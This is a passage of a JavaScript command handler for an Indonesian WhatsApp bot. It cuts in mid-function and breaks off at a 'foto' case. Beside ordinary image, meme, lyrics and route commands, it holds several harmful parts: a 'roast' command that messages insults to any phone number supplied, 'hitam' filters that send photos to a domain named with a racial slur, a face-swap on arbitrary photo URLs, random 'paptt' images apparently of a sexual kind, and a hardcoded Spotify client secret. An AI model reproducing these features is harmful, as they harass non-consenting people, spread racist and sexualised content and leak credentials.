 })
 })
 await new Promise(resolve => setTimeout(resolve, 500))
 
 } catch (error) {
 console.error(`Error processing image ${i + 1} for ${country}:`, error)
 continue
 }
 }
 }
 if (araara.length === 0) {
 throw new Error('No valid images found')
 }
 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: araara
 })
 })
 }
 }
 }, {userJid: m.sender, quoted: m})

 await sock.relayMessage(m.chat, msgii.message, { 
 messageId: msgii.key.id 
 })
 await sock.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 } catch (error) {
 console.error('Error:', error)
 await sock.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
 return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
 }
}
break

case 'hd':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
 const FormData = require('form-data');
 const { fromBuffer } = require('file-type');
 if(m.mtype!='imageMessage')return m.reply('mohon kirim gambarnya');
 m.reply('tunggu sedang di proses');
 const fileBuffer = await m.download();
 const fileType = await fromBuffer(fileBuffer);
 if (!fileType || (!fileType.mime.startsWith('image/') && !fileType.mime.startsWith('video/'))) {
 throw new Error('File harus berformat gambar atau video');
 }
 const fileName = `media_${Date.now()}.${fileType.ext}`;
 const formData = new FormData();
 formData.append('file', fileBuffer, {
 filename: fileName,
 contentType: fileType.mime,
 });
 const response = await axios.post('https://api.ryzendesu.vip/api/uploader/ryzencdn', formData, {
 headers: {
 ...formData.getHeaders(),
 accept: 'application/json',
 },
 });
 let imgurl = response.data.url;
 sock.sendMessage(m.chat,{image:{url:"https://fastrestapis.fasturl.cloud/aiimage/upscale?resize=8&imageUrl="+encodeURIComponent(imgurl)}},{quoted:m})
			}
			db.data.users[m.sender].limit -= 1;
			break

case 'hhd':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
 const FormData = require('form-data');
 const { fromBuffer } = require('file-type');
 if(m.mtype!='imageMessage')return m.reply('mohon kirim gambarnya');
 m.reply('tunggu sedang di proses');
 const fileBuffer = await m.download();
 const fileType = await fromBuffer(fileBuffer);
 if (!fileType || (!fileType.mime.startsWith('image/') && !fileType.mime.startsWith('video/'))) {
 throw new Error('File harus berformat gambar atau video');
 }
 const fileName = `media_${Date.now()}.${fileType.ext}`;
 const formData = new FormData();
 formData.append('file', fileBuffer, {
 filename: fileName,
 contentType: fileType.mime,
 });
 const response = await axios.post('https://api.ryzendesu.vip/api/uploader/ryzencdn', formData, {
 headers: {
 ...formData.getHeaders(),
 accept: 'application/json',
 },
 });
 let imgurl = response.data.url;
 sock.sendMessage(m.chat,{image:{url:"https://fastrestapis.fasturl.cloud/aiimage/upscale?resize=8&imageUrl="+encodeURIComponent(imgurl)}},{quoted:m})
			}
			db.data.users[m.sender].limit -= 1;
			break

case 'readmore': {
 if (!text.includes('|')) return m.reply('Formatnya: readmore teksawal|teksakhir')
 const [awal, akhir] = text.split('|')
 const more = String.fromCharCode(8206).repeat(4001)
 m.reply(`${awal}${more}${akhir}`)
}
 break

case 'cekkodam':
			case 'cekkhodam': {
				if (!text) return m.reply("mana nama mu yang mo di cek??🗿🥸")
				try {
					const khodam = await fetchJson(`https://www.vreden.my.id/cdn/random/khodam.json`)
					const khodamu = await pickRandom(khodam)
					const katakodam = await pickRandom(["awiokwoik 🤣 🗿 🐦", "brakakakak khodam mu apaan kek gitu :v", "😂😂bu mega ketawa melihat ini", "😞ututututu kaciann", "😨ati atii cokk khodam nya ngeri", "ishh ishhh memalukann🗿", "sekopsekopsekop😂", "pengen dosa takut ketawa😂🗿", "sehat sehat yakk adick adick😂🐦", "ututututu🤣🗿"])
					m.sendForward(`Khodam ${text} adalah ${katakodam}`)
				} catch (error) {
					 
				}
			}
			break

case 'meme':
			case 'memeindo': {
				await sock.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let memeindo = await fetchJson(`https://www.vreden.my.id/cdn/game/memeindo.json`)
					const dl_url = await pickRandom(memeindo)
				sock.sendMessage(m.chat, {
						image: {
							url: dl_url.meme
						},
						caption: `nyohhh 🗿`
					}, {
						quoted: m
					})
				} catch (error) {
					 
				}
			}
			break

case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 if (!text.includes(',')) return m.reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
 
 let [from, to] = text.split(',').map(v => v.trim());
 let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
 try {
 let response = await fetch(biyumaunyepong);
 let data = await response.json();
 if (data.status !== 200) return m.reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
 let result = data.result;
 let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
 m.reply(msg);
 } catch (e) {
 console.error(e);
 m.reply('Terjadi kesalahan saat mengambil data!');
 }
 break

case 'filter': {
 const availableFilters = {
 'greyscale': 'Greyscale',
 'sepia': 'Sepia',
 'invert': 'Invert Colors',
 'blur': 'Blur',
 'pixelate': 'Pixelate',
 'brighten': 'Brighten'
 };
 
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 
 if (!mime.startsWith('image')) {
 let filterList = '*Filter yang tersedia:*\n';
 for (const [key, value] of Object.entries(availableFilters)) {
 filterList += `- ${key}: ${value}\n`;
 }
 
 return m.reply(`Balas gambar dengan caption .filter [nama_filter]\n\n${filterList}`);
 }
 
 const selectedFilter = text.trim().toLowerCase();
 
 if (!selectedFilter || !availableFilters[selectedFilter]) {
 return m.reply(`Filter tidak valid. Gunakan salah satu dari: ${Object.keys(availableFilters).join(', ')}`);
 }
 
 try {
 let media = await q.download();
 let imageUrl = await uploadImage(media);
 
 const result = await applyFilter(imageUrl, selectedFilter);
 
 if (!result.success) {
 return m.reply(result.error);
 }
 
 await sock.sendMessage(
 m.chat, 
 { 
 image: { url: result.url },
 caption: `Gambar dengan filter *${availableFilters[selectedFilter]}*`
 }
 );
 
 } catch (error) {
 m.reply(`Gagal menerapkan filter: ${error.message}`);
 }
 
 async function applyFilter(imageUrl, filterName) {
 try {
 const response = await axios.post('https://api.image-editor.com/v1/apply-filter', {
 image_url: imageUrl,
 filter: filterName,
 intensity: filterName === 'blur' ? 5 : filterName === 'pixelate' ? 10 : 1
 });
 
 return {
 success: true,
 url: response.data.processed_image_url
 };
 
 } catch (error) {
 return {
 success: false,
 error: error.response?.data?.message || 'Gagal menerapkan filter'
 };
 }
 }
}
break;

case 'cogan': {
 try {
 const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
 const data = await res.json();
 if (!Array.isArray(data)) return m.reply('Data tidak valid.');
 const randomImage = data[Math.floor(Math.random() * data.length)];
 sock.sendMessage(m.chat, {
 image: { url: randomImage },
 caption: 'Nih cogan buat kamu :v'
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengambil data cogan.');
 }
 }
 break

case 'or': {
 let paptt = [
 "https://files.catbox.moe/s5fa71.jpg",
 "https://files.catbox.moe/ev6ksi.jpg",
 "https://files.catbox.moe/ma7x79.mp4",
 "https://files.catbox.moe/qhhjeh.jpg",
 "https://files.catbox.moe/8dfhl2.mp4",
 "https://files.catbox.moe/860lr1.jpg",
 "https://files.catbox.moe/0bnye4.mp4",
 "https://files.catbox.moe/0pstl2.jpg",
 "https://files.catbox.moe/sz6y3h.jpg",
 "https://files.catbox.moe/566jo3.jpg",
 "https://files.catbox.moe/f3z76v.jpg",
 "https://files.catbox.moe/s9p2xb.jpg",
 "https://files.catbox.moe/muf73e.jpg",

"https://files.catbox.moe/9m0tl2.jpg",

"https://files.catbox.moe/dqvd6x.jpg",

"https://files.catbox.moe/e2xqfn.jpg",

"https://files.catbox.moe/563fpu.jpg",

"https://files.catbox.moe/bmgvct.jpg",

"https://files.catbox.moe/hd392f.jpg",

"https://files.catbox.moe/iy3s9r.jpg",

"https://files.catbox.moe/croxwz.jpg",

"https://files.catbox.moe/cyx1e9.jpg",

"https://files.catbox.moe/0n8zhp.jpg",

"https://files.catbox.moe/n32ia8.jpg",

"https://files.catbox.moe/99q791.jpg",
 ]
 let url = paptt[Math.floor(Math.random() * paptt.length)]
 let isVideo = url.endsWith('.mp4')
 let isImage = url.endsWith('.jpg') || url.endsWith('.jpeg') || url.endsWith('.png')
 if (isVideo) {
 await sock.sendMessage(m.chat, {
 video: { url: url },
 caption: `Nih hasil *paptt* buat kamu`,
 gifPlayback: true
 }, { quoted: m })
 } else if (isImage) {
 await sock.sendMessage(m.chat, {
 image: { url: url },
 caption: `Nih hasil *paptt* buat kamu`
 }, { quoted: m })
 } else {
 m.reply('Format file tidak dikenal.')
 }
 }
 break

case '95': {
 let paptt = [
 "https://files.catbox.moe/860lr1.jpg",
 "https://files.catbox.moe/f3z76v.jpg",
 "https://files.catbox.moe/7xw8fz.mp4",
 "https://files.catbox.moe/0pstl2.jpg",
 "https://files.catbox.moe/566jo3.jpg",
 "https://files.catbox.moe/sz6y3h.jpg",
 "https://files.catbox.moe/s9p2xb.jpg",
 "https://files.catbox.moe/muf73e.jpg",
 "https://files.catbox.moe/dqvd6x.jpg",
 "https://files.catbox.moe/bmgvct.jpg",
 "https://files.catbox.moe/e2xqfn.jpg",
 "https://files.catbox.moe/9m0tl2.jpg",
 ]
 let url = paptt[Math.floor(Math.random() * paptt.length)]
 let isVideo = url.endsWith('.mp4')
 let isImage = url.endsWith('.jpg') || url.endsWith('.jpeg') || url.endsWith('.png')
 if (isVideo) {
 await sock.sendMessage(m.chat, {
 video: { url: url },
 caption: `🗿`,
 gifPlayback: false
 }, { quoted: m })
 } else if (isImage) {
 await sock.sendMessage(m.chat, {
 image: { url: url },
 caption: `🗿`
 }, { quoted: m })
 } else {
 m.reply('Format file tidak dikenal.')
 }
 }
 break

case "hitam": {
 if (!/image/.test(mime)) return m.reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");
 const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
 const buffer = fs.readFileSync(mediaPath);
 const base64Image = buffer.toString("base64");
 try {
const axios = require('axios');
 const response = await axios({
 url: "https://negro.consulting/api/process-image",
 method: "POST",
 data: {
 filter: "hitam",
 imageData: "data:image/png;base64," + base64Image
 }
 });

 const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
 await sock.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

 fs.unlinkSync(mediaPath);
 } catch (err) {
 console.log(err);
 m.reply("Gagal memproses gambar.");
 }
}
break

case 'spotify2': case 'plays2': case 'playspotify2': {
 if (!q) return m.reply("Silakan masukkan judul lagu.\nContoh: *.plays2 blue*");

 await sock.sendMessage(m.chat, { react: { text: "🆂🅰🅱🅰🆁", key: m.key } });
 const client_id = "fe50d7b5a68a4addbb99186d99062c4a";
 const client_secret = "9dda0cf91d524a6bbb18ac18592dd048";
 const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");

const axios = require('axios');
 const getToken = async () => {
 const res = await axios.post(
 "https://accounts.spotify.com/api/token",
 "grant_type=client_credentials",
 {
 headers: {
 Authorization: "Basic " + basic,
 "Content-Type": "application/x-www-form-urlencoded",
 },
 }
 );
 return res.data.access_token;
 };

 const searchTrack = async (query, token) => {
 const res = await axios.get( `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
 {
 headers: {
 Authorization: `Bearer ${token}`,
 },
 }
 );
 if (res.data.tracks.items.length === 0) throw new Error("Lagu tidak ditemukan.");
 return res.data.tracks.items[0];
 };

 const getDownloadLink = async (trackUrl) => {
const axios = require('axios');
 const res = await axios.post(
 "https://spotydown.media/api/download-track",
 { url: trackUrl },
 { headers: { "Content-Type": "application/json" } }
 );
 if (!res.data.file_url) throw new Error("Gagal mengambil link download.");
 return res.data.file_url;
 };

 try {
 const token = await getToken();
 const track = await searchTrack(q, token);
 const downloadUrl = await getDownloadLink(track.external_urls.spotify);
 await sock.sendMessage(m.chat, {
 audio: { url: downloadUrl },
 mimetype: "audio/mpeg",
 ptt: false,
 contextInfo: {
 externalAdReply: {
 title: track.name,
 body: `Artis: ${track.artists.map((a) => a.name).join(", ")}`,
 thumbnailUrl: track.album.images[0]?.url,
 mediaType: 1,
 mediaUrl: track.external_urls.spotify,
 sourceUrl: track.external_urls.spotify,
 },
 },
 }, { quoted: m });
 await sock.sendMessage(m.chat, { react: { text: "🌸", key: m.key } });
 } catch (err) {
 console.log(err);
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
 m.reply("Gagal mengambil lagu. Coba lagi nanti.");
 }
}
break

case 'faceswap': {
 if (!args[0] || !text) {
 return m.reply(`Masukkan 2 URL gambar!\n\nContoh:\n.faceswap [URL target] [URL wajah]`);
 }

 const originalFace = args[0];
 const targetFace = args[1];

 m.reply('*Tunggu sebentar, proses face swap...*');

 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/faceswap?originalFace=${encodeURIComponent(originalFace)}&targetFace=${encodeURIComponent(targetFace)}`;
 
 const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });

 await sock.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: 'nahh berhasil nih swap wajah'
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply(`Gagal melakukan face swap.\n\nError: ${err.message}`);
 }
};
break

case "reactch":
case "rch": {
 if (!isOwner) return m.reply(msg.owner);
 if (!text) return m.reply("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️noisy\n.reactch https://whatsapp.com/channel/xxx/123 ❤️noisy|5");

 const hurufGaya = {
 a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
 h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
 o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
 v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
 '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
 '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
 };

 const [mainText, offsetStr] = text.split('|');
 const args = mainText.trim().split(" ");
 const link = args[0];

 if (!link.includes("https://whatsapp.com/channel/")) {
 return m.reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan noisy|3");
 }

 const channelId = link.split('/')[4];
 const rawMessageId = parseInt(link.split('/')[5]);
 if (!channelId || isNaN(rawMessageId)) return m.reply("Link tidak lengkap!");

 const offset = parseInt(offsetStr?.trim()) || 1;
 const teksNormal = args.slice(1).join(' ');
 const teksTanpaLink = teksNormal.replace(link, '').trim();
 if (!teksTanpaLink) return m.reply("Masukkan teks/emoji untuk direaksikan.");

 const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
 if (c === ' ') return '―';
 return hurufGaya[c] || c;
 }).join('');

 try {
 const metadata = await sock.newsletterMetadata("invite", channelId);
 let success = 0, failed = 0;

 for (let i = 0; i < offset; i++) {
 const msgId = (rawMessageId - i).toString();
 try {
 await sock.newsletterReactMessage(metadata.id, msgId, emoji);
 success++;
 } catch (e) {
 failed++;
 }
 }

 m.reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Gagal memproses permintaan!");
 }
}
break

case "colorize": {
 if (!/image/.test(mime)) return m.reply("Kirim atau reply gambar dengan caption *.colorize*");

 let media = await sock.downloadAndSaveMediaMessage(qmsg);
 const { ImageUploadService } = require('node-upload-images');
 const service = new ImageUploadService('pixhost.to');

 try {
 const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyuofficial.png');
 const res = await fetch(`https://api.ryzendesu.vip/api/ai/colorize?url=${directLink}`);
 if (!res.ok || !res.headers.get('content-type')?.startsWith('image/')) {
 return m.reply("❌ Gagal: Respons bukan gambar atau server error.");
 }
 const hasil = await res.buffer();
 await sock.sendMessage(m.chat, { image: hasil, caption: "✅ Berhasil diwarnai!" }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat proses colorize.");
 } finally {
 await fs.unlinkSync(media);
 }
}
break

case 'lirik':
case 'lyrics':
 try {
 if (!text) return m.reply('Masukkan judul lagu yang ingin dicari liriknya.')

 m.reply('🔎 Mencari lirik lagu...')

 const res = await fetch(`https://api.vreden.my.id/api/lirik?lagu=${encodeURIComponent(text)}`)
 const json = await res.json()

 const data = json.result
 if (!data || !data.status || !data.lirik) return m.reply('❌ Lirik tidak ditemukan.')

 const teks = `*Judul:* ${data.judul}\n*Artis:* ${data.artis}\n*Album:* ${data.album}\n\n${data.lirik}`
 m.reply(teks)
 } catch (e) {
 console.log(e)
 m.reply(`❌ Error\nLogs error : ${e.message}`)
 }
 break

case 'waifu': {
 try {
 const axios = require('axios');
 let res = await axios.get('https://fastrestapis.fasturl.cloud/sfwnsfw/anime?type=sfw&tag=waifu', {
 responseType: 'arraybuffer'
 });

 sock.sendMessage(m.chat, {
 image: Buffer.from(res.data),
 caption: 'Nih waifumu~\n\nCantik Ye 🤗'
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply('Lagi error bang, coba lagi nanti.');
 }
}
break

case "case": {
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./skyzo.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

case "hitamin": {
 if (!/image/.test(mime)) return m.reply("Reply gambar yang mau dihitamin dengan caption *hitamin*");

 const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
 const buffer = fs.readFileSync(mediaPath);
 const base64Image = buffer.toString("base64");

 try {
const axios = require('axios');
 const response = await axios({
 url: "https://negro.consulting/api/process-image",
 method: "POST",
 data: {
 filter: "hitam",
 imageData: "data:image/png;base64," + base64Image
 }
 });

 const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
 await sock.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

 fs.unlinkSync(mediaPath);
 } catch (err) {
 console.log(err);
 m.reply("Gagal memproses gambar.");
 }
}
break

case 'roast':
case 'roasting': {
 let orang = m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : text
 ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : null;
 if (!orang) return m.reply('Tag orang atau ketik nomornya, contoh: *.roast @user* atau *.roast 628xxxx*');
 let ppthumb;
 try {
 ppthumb = await sock.profilePictureUrl(orang, 'image');
 } catch {
 }
 const roastList = [
 `@user, kadang gue mikir, kamu tuh kayak sinyal 1 bar di tengah hutan—nggak berguna tapi selalu muncul pas gak dibutuhin.`,
 `@user, lu tuh kayak charger 15 ribuan—bisa dipake, tapi bikin panas dan ngerusak semuanya.`,
 `@user, kalau otak kamu dijual di marketplace, kemungkinan besar masuk kategori "rusak parah, dijual kiloan".`,
 `@user, kamu kayak WiFi tetangga—kelihatan tapi nggak bisa dipake. Ngeselin banget!`,
 `@user, kalau ngomong tuh kayak lagu remix—banyak noise tapi gak jelas maksudnya.`,
 `@user, kamu itu bukan toxic sih, tapi lebih kayak limbah beracun yang seharusnya dikarantina 40 tahun.`,
 `@user, gaya hidupmu tuh kayak skripsi anak semester 9—jalan di tempat, banyak alasan, hasil nol.`,
 `@user, lu tuh kayak CAPTCHA yang gak bisa ditebak, cuma nyusahin orang doang.`,
 `@user, kalau jadi karakter game, kamu tuh pasti NPC yang ngasih misi gagal dari awal.`,
 `@user, jujur aja... tiap kamu buka mulut, IQ ruangan turun 10 poin.`,
 `@user, muka kamu tuh kayak error 404—nggak ketemu solusinya, bikin stres.`,
 `@user, kalau jadi hewan, kamu pasti masuk kategori hewan mitos, soalnya gak ada yang ngerti eksistensimu.`,
 `@user, kamu tuh kayak alarm jam 5 pagi pas libur—gak penting, cuma ganggu tidur orang.`,
 `@user, IQ kamu tuh kayak ping server merah—tinggi banget tapi gak berguna.`,
 `@user, lu tuh kayak file corrupt—dibuka bikin kesel, dihapus sayang kuota.`,
 `@user, kalau ada lomba jadi beban, lu pasti juara bertahan 5 tahun berturut-turut.`,
 `@user, jokes kamu tuh kayak sinetron azab—maksa, basi, tapi tetep aja nongol.`,
 `@user, ngomong sama lu tuh kayak ngisi CAPTCHA terus gagal, muter-muter gak jelas.`,
 `@user, kalau ketawa lu direkam, bisa dipake buat usir tuyul.`,
 `@user, gaya kamu tuh kayak intro YouTuber 2012—lebay, norak, dan pengen skip.`,
 `@user, lu tuh kayak charger rusak—bisa nyambung tapi nyetrum perasaan orang.`,
 `@user, setiap kamu muncul, vibes-nya kayak error di Windows—tiba-tiba, bikin panik, dan nyusahin.`,
 `@user, kamu itu kayak sandi WiFi yang udah nggak aktif—masih diingat, tapi udah gak guna.`,
 `@user, kamu tuh kayak grup WA keluarga—rame, tapi gak ada faedahnya.`,
 `@user, kalau jadi app, kamu pasti butuh update tiap hari tapi tetep nge-lag.`,
 `@user, tampangmu kayak file zip, kecil tapi isinya berat semua.`,
 `@user, vibes kamu kayak baterai 1%—mau dimanfaatin aja orang males.`,
 `@user, kalau lu jadi sinetron, pasti judulnya *“Anak Durhaka Gagal Update Otak.”*`,
 `@user, lu tuh kayak file download-an gagal—udah nunggu lama, eh error juga.`,
 `@user, otak lu kayak server gratis—down terus tiap dibutuhin.`,
 `@user, kalo jadi emoji, lu tuh pasti "buffering".`,
 `@user, IQ lu kayak koneksi WiFi publik—semua bisa pake, tapi nggak bisa diandalkan.`,
 `@user, tiap kali lu ngomong, grammar dunia ikut menangis.`,
 `@user, kalo jadi film, lu dapet rating 1 bintang dari netizen dan makhluk halus.`,
 `@user, jokes kamu tuh kayak status Facebook 2010—garing, jadul, dan bikin malu.`
 ];
 const roastText = roastList[Math.floor(Math.random() * roastList.length)].replace(/@user/g, `@${orang.split('@')[0]}`);
 try {
 await sock.sendMessage(orang, {
 text: roastText,
 mentions: [orang],
 contextInfo: {
 externalAdReply: {
 sourceUrl: global.linkSaluran
 }
 }
 });
 } catch (error) {
 console.error("Error saat mengirim pesan:", error);
 m.reply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
 }
}
break

case 'autogroup': {
 if (!isOwner) return m.reply('Fitur ini hanya untuk Owner!');
 
 let waktuTutup = '23:00'; // format HH:MM (24 jam)
 let waktuBuka = '05:00';

 m.reply(`*AUTO-GROUP CONTROL ON*\nGrup akan ditutup otomatis pada jam ${waktuTutup} dan dibuka kembali pada jam ${waktuBuka}.`);

 setInterval(async () => {
 let now = new Date();
 let jam = now.getHours().toString().padStart(2, '0');
 let menit = now.getMinutes().toString().padStart(2, '0');
 let waktu = `${jam}:${menit}`;

 if (waktu === waktuTutup) {
 await sock.groupSettingUpdate(m.chat, 'announcement').catch(e => console.log(e));
 sock.sendMessage(m.chat, { text: `*Grup ditutup otomatis oleh sistem*\nMulai jam ${waktuTutup}, hanya admin yang bisa mengirim pesan.` });
 }

 if (waktu === waktuBuka) {
 await sock.groupSettingUpdate(m.chat, 'not_announcement').catch(e => console.log(e));
 sock.sendMessage(m.chat, { text: `*Grup dibuka otomatis oleh sistem*\nMulai jam ${waktuBuka}, semua member bisa mengirim pesan.` });
 }
 }, 60 * 1000); // cek tiap menit
 break;
}

case 'autohari': {
 if (!m.isGroup) return m.reply('Fitur ini cuma bisa dipakai di grup!');
 if (!m.isBotAdmin) return m.reply(mess.botAdmin)
 if (!autohariDB[m.chat]) autohariDB[m.chat] = {}
 const argsLower = q.toLowerCase().split(' ')
 const day = argsLower[0] 
 const state = argsLower[1]
 const validDays = ['senin', 'selasa', 'rabu', 'kamis', 'jumat', 'sabtu', 'minggu']
 if (!validDays.includes(day)) {
 return m.reply(`Hari yang valid: ${validDays.join(', ')}\n\nContoh:\n.autohari senin on`)
 }
 if (state === 'on') {
 autohariDB[m.chat][day] = { active: true }
 saveAutohari()
 m.reply(`✅ Fitur AutoHari untuk hari ${day} telah diaktifkan!`)
 } else if (state === 'off') {
 autohariDB[m.chat][day] = { active: false }
 saveAutohari()
 m.reply(`❌ Fitur AutoHari untuk hari ${day} telah dinonaktifkan!`)
 } else {
 m.reply(`Contoh:\n*${prefix}autohari senin on*\n*${prefix}autohari selasa off*`)
 }
}
break

case"upch":
case 'upsaluran':{
if (!text) return m.reply("teks?")
sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
sock.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
sock.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363323504214146@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${text}`,
newsletterJid: "120363323504214146@newsletter"}
}},{quoted: m})
await sleep(2000)
sock.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
m.reply(`mengirim audio ke channel berhasil`)
}
break

case 'upch1': {
 if (!isCmd) return;
 if (!quoted) {
 return m.reply(`🖼️ *Fotonya mana?*`);
 }
 
 if (!args.length) {
 return m.reply(`⚠️ *Masukkan ID channel dan teks/caption menggunakan format idch|text.*`);
 }
 
 // Memisahkan ID channel dan teks caption dari input menggunakan "|"
 const input = args.join(' ').split('|');
 const channelId = input[0].trim(); // ID channel
 const caption = input[1] ? input[1].trim() : wm2 ; // Caption default jika tidak ada teks
 
 // Cek apakah media adalah gambar
 if (/image/.test(mime)) {
 let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
 
 try {
 // Mengupload gambar ke channel dengan caption custom
 await sock.sendMessage(channelId, {
 image: media,
 caption: caption
 });
 
 // Mengirim pesan konfirmasi
 await m.reply(`✅ *Media gambar berhasil diupload ke channel:* ${channelId}`);
 } catch (error) {
 console.error('Error saat mengupload media gambar:', error);
 await m.reply('❌ *Gagal mengupload gambar. Silakan periksa ID channel dan format media.*');
 }
 } 
 // Cek apakah media adalah audio dan mengirim sebagai VN
 else if (/audio/.test(mime)) {
 let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
 
 try {
 // Mengupload audio sebagai voice note (VN) ke channel
 await sock.sendMessage(channelId, {
 audio: media,
 ptt: true, // Mengirim sebagai pesan suara (voice note)
 mimetype: 'audio/mp4' // Ganti jika perlu
 });
 
 // Mengirim pesan konfirmasi
 await m.reply(`✅ *Voice note berhasil diupload ke channel:* ${channelId}`);
 } catch (error) {
 console.error('Error saat mengupload voice note:', error);
 await nerokreply('❌ *Gagal mengupload voice note. Silakan periksa ID channel dan format media.*');
 }
 } else {
 await m.reply(`📸 *Silakan kirim atau balas foto atau audio dengan caption* ${prefix + command}`);
 }
 
 }
 break;

case 'tourl2': {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 sock.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
 } catch (e) {
 console.error(e);
 m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 m.reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
 }
};
break

case 'foto': {
 if (!text) return m.reply(`*[ ! ]* Wrong Input!\n\n*Example:* ${prefix + command} Mas Rusdi`);

 sock.sendMessage(m.chat, {
 react: {
 text: '🔎',
 key: m.key,
 }
 });

 try {
